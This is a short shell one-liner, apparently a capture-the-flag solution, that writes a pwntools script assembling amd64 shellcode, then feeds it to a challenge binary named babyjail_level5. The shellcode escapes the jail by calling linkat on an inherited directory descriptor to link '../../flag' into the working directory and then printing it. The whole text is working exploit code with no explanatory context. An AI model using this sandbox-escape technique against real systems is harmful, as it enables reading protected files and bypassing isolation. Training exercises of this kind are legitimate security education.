echo 'import pwn

pwn.context.arch = "amd64"

# Create shellcode to open the file
openat_shellcode = pwn.shellcraft.amd64.linkat(3,"../../flag", "AT_FDCWD", "./flags").rstrip()

write_shellcode = pwn.shellcraft.amd64.cat("./flags").rstrip()

# Assemble the combined shellcode
assembly = pwn.asm(openat_shellcode+write_shellcode)

with open("raw", "wb") as f:
    f.write(assembly)' > sand.py && /bin/python3 sand.py && /challenge/babyjail_level5 . < raw